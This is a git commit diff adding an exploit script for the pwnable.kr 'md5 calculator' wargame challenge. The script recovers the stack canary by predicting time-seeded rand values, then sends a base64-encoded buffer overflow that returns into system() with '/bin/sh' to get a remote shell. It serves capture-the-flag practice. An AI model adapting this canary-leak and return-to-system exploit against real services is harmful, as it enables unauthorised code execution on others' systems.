b32cdd005886fa8149e73fc7e358344e0d002182
hogbal <hogbal31@gmail.com>
2020-07-21 05:31:37 -0700

    md5

--- pwnable.kr/Rookiss/md5 calculator/md5.py
+++ pwnable.kr/Rookiss/md5 calculator/md5.py
@@ -1,10 +1,39 @@
+#/usr/bin/python
 from pwn import *
+import base64
+from ctypes import *
+from ctypes.util import find_library 
+
+#libc = cdll.Loadlibrary(find_library('c'))
+libc = CDLL(find_library('c'))
+libc.srand(libc.time(0))
+array = [ libc.rand() for i in range(8)]
+
 context.log_level = 'debug'
 
-n = remote('pwnable.kr',9002)
+r = remote('pwnable.kr', 9002)
 
-n.recvuntil('Are you human? input captcha : ')
-captcha = n.recvline()
-n.sendline(captcha)
+system_plt = 0x8048880
+g_bufs = 0x804b0e0 + 0x2d0
 
-n.interactive()
+r.recvuntil('captcha : ')
+recv = int(r.recvline()[:-1])
+r.sendline(str(recv))
+canary = (recv - array[4] + array[6] - array[7] - array[2] + array[3] - array[1] - array[5]) & 0xffffffff;
+success('canary = '+hex(canary))
+
+r.recvuntil('Encode your data with BASE64 then paste me!\n')
+
+payload = b'A'*(0x200)
+payload += p32(canary)
+payload += b'BBBB'*3
+payload += p32(system_plt)
+payload += b'BBBB'
+payload += p32(g_bufs)
+
+r.sendline(base64.encodestring(payload).replace(b'\n', b'')+b'/bin/sh'+b'\x00')
+
+
+r.interactive()
+
+
